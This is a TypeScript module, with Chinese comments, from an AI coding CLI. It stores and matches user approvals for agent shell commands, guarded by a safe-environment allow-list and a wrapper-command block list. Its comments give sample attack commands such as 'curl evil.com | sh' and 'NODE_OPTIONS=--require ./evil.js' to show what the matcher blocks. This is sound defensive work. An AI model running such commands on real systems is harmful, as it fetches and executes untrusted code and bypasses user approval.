// @x-code-cli/core — 带磁盘持久化的权限记忆。
//
// 当用户以“不再询问”批准某次工具调用时，该决定会以 AllowRule 的形式
// 同时保存在内存和磁盘（`.x-code/local/permissions.json`）中。下次启动时
// 会重新加载持久化规则，使批准跨会话生效。
import path from 'node:path'

import { isReadOnly, splitShellCommands } from '../tools/shell-utils.js'
import { persistRule, readPersistedRules } from './persistence.js'

export interface AllowRule {
  tool: string
  pattern: string
  type: 'exact' | 'prefix' | 'tool'
  cwd?: string
}

// 环境变量赋值前缀：VAR=value（不带引号，仅限安全字符）。
// 捕获组暴露出变量名，使白名单能决定是剥离前缀还是视其为危险项（见 SAFE_ENV_VARS）。
const ENV_VAR_RE = /^([A-Za-z_]\w*)=[A-Za-z0-9_./:@-]*\s+/

// 推导“不再询问”前缀前可安全剥离的环境变量名。
// 刻意保守——任何可能以安全相关方式改变程序行为的东西
// （PATH、LD_*、NODE_OPTIONS、http(s)_proxy、DYLD_* 等）都被排除，
// 使未列入白名单的赋值将规则降级为精确匹配。否则 agent 就能把未经审计的
// 环境变量夹带进一个已获批准的命令形态里。
//
// 覆盖实践中 agent 常见的 NODE_ENV / CI / DEBUG / locale / color 设置，
// 精神上对齐 Claude Code 的 SAFE_ENV_VARS 列表。
const SAFE_ENV_VARS = new Set([
  'NODE_ENV',
  'PYTHONUNBUFFERED',
  'PYTHONIOENCODING',
  'PYTHONDONTWRITEBYTECODE',
  'CI',
  'DEBUG',
  'FORCE_COLOR',
  'NO_COLOR',
  'CLICOLOR',
  'CLICOLOR_FORCE',
  'TERM',
  'COLORTERM',
  'LANG',
  'LC_ALL',
  'LC_CTYPE',
  'LC_MESSAGES',
  'LC_TIME',
  'LC_COLLATE',
  'TZ',
  'EDITOR',
  'VISUAL',
  'PAGER',
  'LESS',
])

// 首令牌包装器过于宽泛，不能作为“不再询问”规则的锚点。
// 批准过一次 `sudo ls` 绝不能让 `sudo <anything>` 自动批准；我们也（尚未）
// 拆开 `bash -c "<inner>"` 重新提取——因此这些情况返回 null 并强制精确匹配。
// `sudo` 还会被上游 isDestructive() 捕获；此处列出属于纵深防御。
const WRAPPER_BLOCKLIST = new Set([
  'sudo',
  'doas',
  'su',
  'bash',
  'sh',
  'zsh',
  'fish',
  'dash',
  'ksh',
  'cmd',
  'env',
  'time',
  'nice',
  'ionice',
  'timeout',
  'nohup',
  'xargs',
  'watch',
  'parallel',
  'exec',
  'eval',
])

// 各命令的全局标志表：介于 `cmd` 与其真正子命令之间的令牌。
// 没有这些，`git -C /tmp commit` 会提取出 `git -C`，从而错过用户为
// `git commit` 设置的所有前缀规则。
//
// `valued` 标志消耗其后一个令牌；其余以 `-` 开头的都当作布尔标志
// （跳过一个）。`--name=value` 通过内嵌的 `=` 识别。`cargo +toolchain`
// 是唯一需要跳过的非标志令牌，由 `takesPlus` 控制。
const GLOBAL_FLAGS: Record<string, { valued: Set<string>; takesPlus?: boolean }> = {
  git: {
    valued: new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--exec-path', '--super-prefix']),
  },
  docker: {
    valued: new Set([
      '-H',
      '--host',
      '--config',
      '--context',
      '-c',
      '--log-level',
      '--tlscacert',
      '--tlscert',
      '--tlskey',
    ]),
  },
  podman: {
    valued: new Set(['--connection', '-c', '--log-level', '--root', '--runroot', '--storage-driver', '--url']),
  },
  kubectl: {
    valued: new Set([
      '-n',
      '--namespace',
      '--context',
      '--cluster',
      '--kubeconfig',
      '--server',
      '-s',
      '--user',
      '--token',
      '--as',
      '--as-group',
      '--cache-dir',
      '--certificate-authority',
      '--client-certificate',
      '--client-key',
    ]),
  },
  cargo: {
    valued: new Set(['--config', '-Z', '--color', '--manifest-path']),
    takesPlus: true,
  },
}

// 子命令名形态：小写字母开头，后接 [a-z0-9-]。连字符只能在中间（不允许
// 结尾连字符）。用于过滤掉 `-flag`、`/flag` 和路径。
const SUBCOMMAND_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/

// PowerShell Verb-Noun cmdlet 形态：`Get-ChildItem`、`Sort-Object`、
// `Invoke-WebRequest` 等。一个 Verb 段（首字母大写 + 小写），随后是 ≥1 个
// 用 `-` 分隔的 Noun 段。每个 Noun 也必须以大写字母开头，这样就不会接受
// `git-foo`（带连字符的 Unix 风格命令）——它们应继续走 POSIX 子命令路径。
// 整个令牌本身就是前缀：cmdlet 接收 `-Parameter Value` 参数，而非子命令。
const VERB_NOUN_CMDLET_RE = /^[A-Z][a-z]+(?:-[A-Z][A-Za-z0-9]*)+$/

// 视为纯准备步骤的复合段头部（位于“真正”命令之前的目录切换）。
// 批准 `cd D:\foo && npm test` 应锚定在 `npm test` 上，而非字面的 cd。
// 同时匹配 POSIX（`cd`、`pushd`、`popd`、`chdir`）和 PowerShell
// （`Set-Location`、`Push-Location`、`Pop-Location` 及其 `sl`/`pushd`/`popd`
// 别名）。因为 PowerShell 不区分大小写，故此处也不区分。
const CD_LIKE_RE = /^(?:cd|chdir|pushd|popd|set-location|push-location|pop-location|sl)\b/i

// 识别 `powershell` / `powershell.exe` / `pwsh` 调用前缀。
// 这里不尝试匹配整体形态——agent 使用的标志组合很多
// （`-NoProfile`、`-ExecutionPolicy Bypass`、`-File foo.ps1`、
// 不带 `-Command` 的裸调用）。只识别启动器；下方的提取器会扫过标志
// 找到内部命令。
const POWERSHELL_LAUNCHER_RE = /^(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i

// 从带引号的 PowerShell 内部提取首个 cmdlet 或命令名。
// 处理 Verb-Noun cmdlet（Get-Process）和普通命令（git、npm）。
const PS_INNER_CMD_RE = /["']?\s*(?:&\s*\{?\s*)?([A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+|[a-z][a-z0-9._-]*)/

/**
 * 提取适用于前缀匹配规则的命令前缀。
 * 当无法安全推导出有意义的前缀时返回 `null`——调用方回退到精确匹配。
 *
 *   'git commit -m "fix"'                                    → 'git commit'
 *   'git -C /tmp commit -m fix'                              → 'git commit'
 *   'docker -H tcp://host:2375 ps'                           → 'docker ps'
 *   'kubectl -n prod get pods'                               → 'kubectl get'
 *   'cargo +nightly build --release'                         → 'cargo build'
 *   'pnpm run build'                                         → 'pnpm run'
 *   'npm install lodash'                                     → 'npm install'
 *   'NODE_ENV=prod npm run dev'                              → 'npm run'
 *   'FOO=1 git status'                                       → null   （不安全的环境变量）
 *   'sudo npm install'                                       → null   （包装器）
 *   'bash -c "git status"'                                   → null   （包装器）
 *   'powershell -Command "Get-CimInstance ..."'              → 'Get-CimInstance'
 *   'powershell -NoProfile -Command "Get-CimInstance ..."'   → 'Get-CimInstance'
 *   'powershell -ExecutionPolicy Bypass -c "git status"'     → 'git'
 *   'pwsh -Command "& { Get-Process }"'                      → 'Get-Process'
 *   'powershell -Command Get-Date'                           → 'Get-Date'
 *   'Get-ChildItem -Recurse -Filter *.ts'                    → 'Get-ChildItem'
 *   'Invoke-WebRequest -Uri http://api'                      → 'Invoke-WebRequest'
 *   'cd /tmp && npm test'                                    → 'npm test'
 *   'cd D:\\foo && npx tsc --noEmit | head -40'              → 'npx tsc'
 *   'Set-Location D:\\foo; Get-ChildItem -Recurse | Sort-Object Name'
 *                                                            → 'Get-ChildItem'
 *   'npm install && curl bad.com'                            → null
 *                                                              （两个不同的
 *                                                              非只读段——
 *                                                              没有共享前缀，
 *                                                              回退到精确
 *                                                              匹配）
 *   'git commit -m a && git push'                            → null   （各段
 *                                                              前缀不一致）
 *   'ls -la'                                                 → null
 *   ''                                                       → null
 */
export function extractCommandPrefix(command: string): string | null {
  const cmd = command.trim()
  if (!cmd) return null

  // PowerShell 启动器命令（`powershell.exe -Command "..."`）拥有整个字符串——
  // 内部脚本可能包含 `;` 和 `|`，splitShellCommands 会错误拆分。因此优先处理
  // 并直接短路返回。
  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    return extractPowershellPrefix(cmd)
  }

  // 复合命令（`;`、`&&`、`||`、`|`）：仅当每个非只读段都同意同一前缀时才
  // 推导前缀。只读段（`cd /foo`、`head -40`、`Sort-Object Name` 等）属于
  // 准备或仅展示——会被跳过，因此 `cd /foo && npm test` 锚定在 `npm test`
  // 上，但 `git commit && git push` 返回 null，因为批准 "git commit"
  // 绝不能自动批准 "git push"。
  //
  // 先拆分也堵上了一个安全漏洞：不拆分的话，旧的单段提取器会欣然为
  // `npm install && curl bad.com | sh` 返回 `npm install`，使已批准的
  // `npm install:*` 规则悄悄批准后面的 curl 加管道到 sh 的部分。
  // （`curl … | sh` 本身会被 isDestructive 捕获，但该原则可推广——
  // 首个段的规则不能信任任何非只读的第二段。）
  const segments = splitShellCommands(cmd)
  if (segments.length > 1) {
    let derived: string | null = null
    for (const seg of segments) {
      if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
      const segPrefix = extractSingleCommandPrefix(seg)
      if (!segPrefix) return null
      if (derived === null) derived = segPrefix
      else if (derived !== segPrefix) return null
    }
    return derived
  }

  return extractSingleCommandPrefix(cmd)
}

/**
 * 从单个 shell 命令（不含复合操作符）提取前缀。
 * 是 {@link extractCommandPrefix} 的内部辅助函数；假设调用方已按
 * `;` / `&&` / `||` / `|` 拆分，并一次传入一个段。
 */
function extractSingleCommandPrefix(command: string): string | null {
  const cmd = command.trim()
  if (!cmd) return null

  const tokens = cmd.split(/\s+/).filter(Boolean)
  if (tokens.length === 0) return null

  // 逐令牌剥离环境变量。位于头部的环境变量形态令牌（NAME=…）要么在白名单内，
  // 要么直接中止——否则 agent 就能把 PATH=/evil、NODE_OPTIONS=--require
  // ./evil.js、http_proxy=… 等夹带进形如 `npm run` 的规则里。这一层
  // 有意不约束值的字符：安全与否由 NAME 决定，而任意的值字符类会让
  // 怪异但安全的值（`/`、`$`、`:`）完全绕过检查。
  let i = 0
  while (i < tokens.length) {
    const tok = tokens[i]!
    const m = /^([A-Za-z_]\w*)=/.exec(tok)
    if (!m) break
    if (!SAFE_ENV_VARS.has(m[1]!)) return null
    // 引号值跨空白拆分（`FOO="a b" cmd`）意味着我们的 \s+ 分词器破坏了
    // 值的边界。没有真正的 shell 解析器就无法确定值的结尾，因此拒绝该前缀。
    const value = tok.slice(m[0].length)
    if (hasUnclosedQuote(value)) return null
    i++
  }

  const rest = tokens.slice(i)
  if (rest.length === 0) return null

  // PowerShell cmdlet（如 `Get-ChildItem` 这类 Verb-Noun）本身就是前缀：
  // cmdlet 不像 `git`/`docker` 那样有子命令，而是接收 `-Parameter` 参数。
  // 旧代码在等一个符合 SUBCOMMAND_RE 形态的第二个令牌，遇到
  // `Get-ChildItem -Recurse …` 之类就静默返回 null。识别 cmdlet 形态并
  // 直接返回。这里刻意在 `rest.length < 2` 门槛之前运行，使裸的
  // `Get-Process` 也是有效前缀（`Get-ChildItem:*` 这类单 cmdlet 规则，
  // 相当于 PowerShell 侧的 `git status:*`）。
  if (VERB_NOUN_CMDLET_RE.test(rest[0]!)) {
    return rest[0]!
  }

  if (rest.length < 2) return null

  const firstLower = rest[0]!.toLowerCase()
  if (WRAPPER_BLOCKLIST.has(firstLower)) return null

  const subIdx = skipGlobalFlags(rest, firstLower)
  if (subIdx >= rest.length) return null

  const sub = rest[subIdx]!
  if (!SUBCOMMAND_RE.test(sub)) return null

  return `${rest[0]} ${sub}`
}

function hasUnclosedQuote(s: string): boolean {
  let sq = 0
  let dq = 0
  for (const ch of s) {
    if (ch === "'") sq++
    else if (ch === '"') dq++
  }
  return sq % 2 === 1 || dq % 2 === 1
}

function skipGlobalFlags(tokens: string[], firstLower: string): number {
  const cfg = GLOBAL_FLAGS[firstLower]
  if (!cfg) return 1
  let i = 1
  while (i < tokens.length) {
    const tok = tokens[i]!
    if (cfg.takesPlus && tok.startsWith('+')) {
      i++
      continue
    }
    if (!tok.startsWith('-')) break
    // --flag=value：单个令牌，前进一次。
    if (tok.includes('=')) {
      i++
      continue
    }
    if (cfg.valued.has(tok)) {
      i += 2
      continue
    }
    // 未知的布尔型标志——尽力跳过。偏向“找到子命令”，与用户在 CLI 上
    // 看到的一致。
    i++
  }
  return i
}

function extractPowershellPrefix(cmd: string): string | null {
  const tokens = cmd.split(/\s+/).filter(Boolean)
  let i = 1 // 跳过启动器
  while (i < tokens.length) {
    const tok = tokens[i]!
    if (!tok.startsWith('-')) break
    const lower = tok.toLowerCase()
    if (lower === '-command' || lower === '-c') {
      i++
      break
    }
    if (lower === '-file') return null
    if (
      lower === '-executionpolicy' ||
      lower === '-encodedcommand' ||
      lower === '-inputformat' ||
      lower === '-outputformat' ||
      lower === '-version' ||
      lower === '-windowstyle' ||
      lower === '-configurationname' ||
      lower === '-mta' ||
      lower === '-sta'
    ) {
      i += 2
      continue
    }
    i++
  }
  if (i >= tokens.length) return null
  const inner = tokens.slice(i).join(' ')
  const m = PS_INNER_CMD_RE.exec(inner)
  return m?.[1] ?? null
}

/**
 * 与 {@link extractCommandPrefix} 类似，但对复合命令返回完整的不同前缀集合——
 * 每个非只读、非 cd 段各一个。
 *
 * 当任一非只读段没有可推导前缀时返回 `null`（调用方现在可通过
 * {@link extractCompoundRules} 获得更丰富的回退），或者当所有段都被
 * 过滤为只读 / cd 类时返回 `null`（主要是防御性的——这些在上游会
 * 自动允许）。
 *
 * 保留导出以兼容只需要前缀列表的调用方——当前内部调用方使用的是
 * 更丰富的 {@link extractCompoundRules}。
 */
export function extractCompoundPrefixes(command: string): string[] | null {
  const cmd = command.trim()
  if (!cmd) return null

  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)
    return p ? [p] : null
  }

  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()
  const out: string[] = []
  for (const seg of segments) {
    if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
    const p = extractSingleCommandPrefix(seg)
    if (!p) return null
    if (!seen.has(p)) {
      seen.add(p)
      out.push(p)
    }
  }
  return out.length === 0 ? null : out
}

/**
 * 复合命令的逐段规则提取。每个非只读、非 cd 段返回一条规则：
 *   - 段有可推导前缀时返回前缀规则（例如 `git commit -m foo` →
 *     `{ type: 'prefix', pattern: 'git commit' }`）
 *   - 否则返回段级精确规则（例如 `curl evil.com` →
 *     `{ type: 'exact', pattern: 'curl evil.com' }`）
 *
 * 混合正是要点：`git commit && curl evil.com` 之前会坍缩成单条整命令精确
 * 匹配，因为 `curl evil.com` 没有前缀，白白丢掉了完全可以推导的
 * `git commit:*`。现在标签显示为 `git commit:*, curl evil.com`，一次点击
 * 保存两条规则。匹配器接受针对整条命令（旧行为）或任一非只读段的精确
 * 规则，因此后续 `cd /tmp && git commit -m b && curl evil.com` 能干净地
 * 自动批准。
 *
 * 当没有任何段产出规则时返回 `null`（全只读复合——上游会自动允许，
 * 实践中不会走到这里），或者遇到使该段失效的非白名单环境变量前缀时
 * 返回 `null`（与单命令路径相同的安全门槛）。
 */
export function extractCompoundRules(command: string): AllowRule[] | null {
  const cmd = command.trim()
  if (!cmd) return null

  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)
    return p ? [{ tool: 'shell', pattern: p, type: 'prefix' }] : null
  }

  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()
  const out: AllowRule[] = []

  for (const seg of segments) {
    const trimmed = seg.trim()
    if (isReadOnly(trimmed) || CD_LIKE_RE.test(trimmed)) continue

    const prefix = extractSingleCommandPrefix(trimmed)
    if (prefix) {
      const key = `prefix:${prefix}`
      if (!seen.has(key)) {
        seen.add(key)
        out.push({ tool: 'shell', pattern: prefix, type: 'prefix' })
      }
      continue
    }

    // 没有前缀——回退到段级精确规则。剥离安全环境变量使匹配键保持规范；
    // 若存在非白名单的环境变量赋值则拒绝（与 extractSingleCommandPrefix
    // 相同的姿态）。
    const headEnv = /^([A-Za-z_]\w*)=/.exec(trimmed)
    if (headEnv && !SAFE_ENV_VARS.has(headEnv[1]!)) return null
    const exact = stripSafeEnvVars(trimmed)
    if (!exact) return null
    const key = `exact:${exact}`
    if (!seen.has(key)) {
      seen.add(key)
      out.push({ tool: 'shell', pattern: exact, type: 'exact' })
    }
  }

  return out.length === 0 ? null : out
}

/**
 * 生成“不再询问”选项的展示标签。
 * 仅对“不再询问”没有意义的工具返回 `null`（enterPlanMode 切换的是模式，
 * 而非重复性动作）。
 *
 * shell，单个可推导前缀：   `git commit:*`
 * shell，多个可推导前缀（各段不一致的复合命令——例如
 *   `git commit && git push`）：`git commit:*, git push:*`
 *   ——点击一次保存两条规则，后续复合调用不再询问。
 * shell，无可推导前缀：     `this exact command`（精确匹配规则——覆盖
 *   Windows 风格命令，如 `findstr /n …`、`cmd /c …`、`dir /b`，其第二个
 *   令牌是 `/flag` 或路径，无法通过前缀正则；没有这个回退，用户对重复的
 *   相同命令将永远只有 Yes/No）。
 * 写工具（writeFile / edit）：`all edits this session`（仅会话）
 * MCP 工具（isMcp=true）：    `this MCP tool`（通过 McpPermissionStore
 *   持久化到磁盘——标签与这种持久化姿态一致，不同于回退到仅会话的写工具）。
 */
export function suggestRuleLabel(toolName: string, input: Record<string, unknown>, isMcp = false): string | null {
  if (toolName === 'enterPlanMode') return null
  if (isMcp) return 'this MCP tool'
  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''
    const rules = extractCompoundRules(cmd)
    if (!rules || rules.length === 0) return 'this exact command'
    // 单条规则且其精确模式等于整条命令 → 保留旧版简洁标签，而不是把命令
    // 原样回显给用户。这样对于 `findstr /n …` / `cmd /c …` 这类根本没有
    // 可推导前缀的调用，仍能保持可读的 "this exact command" 措辞。
    if (rules.length === 1) {
      const r = rules[0]!
      if (r.type === 'exact' && r.pattern === stripSafeEnvVars(cmd)) return 'this exact command'
    }
    return rules.map((r) => (r.type === 'prefix' ? `${r.pattern}:*` : r.pattern)).join(', ')
  }
  return 'all edits this session'
}

/**
 * 为一次“不再询问”批准构建 AllowRule 规则。
 *
 * - 有可推导前缀的 shell → 每个不同的非只读段一条前缀规则。
 *   `git commit && git push` 一次点击保存 `git commit:*` 和 `git push:*`
 *   两条（与展示给用户的复合标签一致）。持久化到磁盘。
 * - 无可推导前缀的 shell → 单条精确匹配规则并持久化（对齐 Claude Code
 *   `bashPermissions.ts` 中 `suggestionForExactCommand` 的回退）。复用性
 *   不如前缀规则（任何参数变化都会破坏匹配），但至少能抑制重复的相同
 *   调用——好过“永远 Yes/No”。匹配器与 `stripEnvVars(cmd)` 比较，因此
 *   前导的 `NODE_ENV=…` 等不会破坏规则。
 * - writeFile / edit → 单条工具级允许，仅会话（与 Claude Code 一致）。
 *
 * `persist` 表示规则是否应保存到磁盘。写工具返回 persist=false；
 * 其余都返回 persist=true。仅在极少数没有规则形态适用的情况下返回
 * `null`（目前没有——保留在签名中以便调用方保持防御性）。
 */
export function buildAllowRule(
  toolName: string,
  input: Record<string, unknown>,
  executionCwd?: string,
): { rules: AllowRule[]; persist: boolean } | null {
  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''
    const rules = extractCompoundRules(cmd)
    if (rules && rules.length > 0) {
      return {
        rules: rules.map((rule) => ({ ...rule, ...(executionCwd ? { cwd: executionCwd } : {}) })),
        persist: true,
      }
    }
    // 仅剥离*安全*的环境变量前缀——与匹配器比较所用的键一致
    // （stripSafeEnvVars）。非白名单赋值保留在模式中，使对
    // `BACKDOOR=1 findstr …` 的批准不会意外地单独自动允许 `findstr …`。
    const exact = stripSafeEnvVars(cmd)
    if (!exact) return null
    return {
      rules: [{ tool: toolName, pattern: exact, type: 'exact', ...(executionCwd ? { cwd: executionCwd } : {}) }],
      persist: true,
    }
  }
  return { rules: [{ tool: toolName, pattern: '*', type: 'tool' }], persist: false }
}

function stripSafeEnvVars(command: string): string {
  let cmd = command.trim()
  while (true) {
    const m = ENV_VAR_RE.exec(cmd)
    if (!m) break
    if (!SAFE_ENV_VARS.has(m[1]!)) break
    cmd = cmd.slice(m[0].length)
  }
  return cmd.trim()
}

// ─── 存储 ───

class SessionPermissionStore {
  private rules: AllowRule[] = []

  addRule(rule: AllowRule): void {
    const exists = this.rules.some(
      (r) => r.tool === rule.tool && r.pattern === rule.pattern && r.type === rule.type && r.cwd === rule.cwd,
    )
    if (!exists) this.rules.push(rule)
  }

  removeRule(rule: AllowRule): void {
    this.rules = this.rules.filter(
      (r) => !(r.tool === rule.tool && r.pattern === rule.pattern && r.type === rule.type && r.cwd === rule.cwd),
    )
  }

  matches(toolName: string, input: Record<string, unknown>, executionCwd?: string): boolean {
    if (toolName !== 'shell') {
      // 非 shell 工具：工具级允许是目前唯一会产出的规则形态。
      // 精确 / 前缀仅用于 shell。
      for (const rule of this.rules) {
        if (rule.tool !== toolName) continue
        if (rule.type === 'tool') return true
      }
      return false
    }

    const cmd = (input.command as string) ?? ''

    // 第一遍：工具级与精确规则作用于整条命令字符串。（用户原则上可以
    // 精确批准一条破坏性命令；我们尊重这一点。）
    for (const rule of this.rules) {
      if (rule.tool !== toolName) continue
      if (rule.cwd !== executionCwd) continue
      if (rule.type === 'tool') return true
      if (rule.type === 'exact' && stripSafeEnvVars(cmd) === rule.pattern) return true
    }

    // 第二遍：感知复合命令的前缀匹配。命令的每个非只读、非 cd 类段都必须
    // 单独匹配至少一条已持久化的前缀规则。这正是让一次点击
    // `git commit && git push` 保存两条前缀，并使未来的
    // `git commit -m foo && git push origin main` 自动批准的原因。
    //
    // “每段都必须匹配”是安全门槛：如果用户只批准过 `git commit:*`，
    // 之后的 `git commit -m a && curl evil.com | sh` 仍会询问——`curl`
    // 没有匹配规则。（`| sh` 也会被上游 isDestructive 捕获；该原则可
    // 推广到该模式之外。）
    const segments = splitShellCommands(cmd)
    const checkable = segments.filter((seg) => !isReadOnly(seg) && !CD_LIKE_RE.test(seg.trim()))
    if (checkable.length === 0) return false

    for (const seg of checkable) {
      const segText = stripSafeEnvVars(seg.trim())
      const segPrefix = extractSingleCommandPrefix(seg)
      let segMatched = false
      for (const rule of this.rules) {
        if (rule.tool !== toolName) continue
        if (rule.cwd !== executionCwd) continue
        if (rule.type === 'prefix' && segPrefix) {
          if (segPrefix === rule.pattern || segPrefix.startsWith(rule.pattern + ' ')) {
            segMatched = true
            break
          }
        } else if (rule.type === 'exact' && segText === rule.pattern) {
          // 逐段精确：覆盖混合复合规则集中 `curl evil.com` 这一半。
          // 上方的整命令精确匹配已处理旧版“逐字批准整条复合命令”的情形。
          segMatched = true
          break
        }
      }
      if (!segMatched) return false
    }
    return true
  }

  clear(): void {
    this.rules = []
  }

  get size(): number {
    return this.rules.length
  }
}

const store = new SessionPermissionStore()

export function addSessionAllowRule(rule: AllowRule): void {
  store.addRule(rule)
}

export function removeSessionAllowRule(rule: AllowRule): void {
  store.removeRule(rule)
}

export function sessionRulesMatch(toolName: string, input: Record<string, unknown>, executionCwd?: string): boolean {
  return store.matches(toolName, input, executionCwd)
}

export function clearSessionRules(): void {
  store.clear()
}

// ─── 磁盘持久化 ───

/** 从每个项目文件最近一次加载的规则，使重载能移除用户在磁盘上删除的规则，
 *  同时不影响仅会话的批准。 */
const rulesLoadedFromDisk = new Map<string, AllowRule[]>()

/**
 * 从 `.x-code/local/permissions.json` 把持久化权限规则加载进内存存储。
 * 可安全地多次调用（自动去重）。文件不存在或格式错误时静默无操作。
 */
export function loadPersistedRules(cwd: string): void {
  const rules = readPersistedRules(cwd)
  for (const rule of rules) store.addRule(rule)
  rulesLoadedFromDisk.set(path.resolve(cwd), rules)
}

/**
 * 重读项目文件并换掉从其中加载的规则：磁盘上新增的规则立即生效，
 * 磁盘上删除的规则立即失效。本会话内批准的规则不受影响。
 */
export function reloadPersistedRules(cwd: string): void {
  const key = path.resolve(cwd)
  const before = rulesLoadedFromDisk.get(key) ?? []
  const after = readPersistedRules(cwd)
  for (const rule of before) store.removeRule(rule)
  for (const rule of after) store.addRule(rule)
  rulesLoadedFromDisk.set(key, after)
}

export { persistRule }
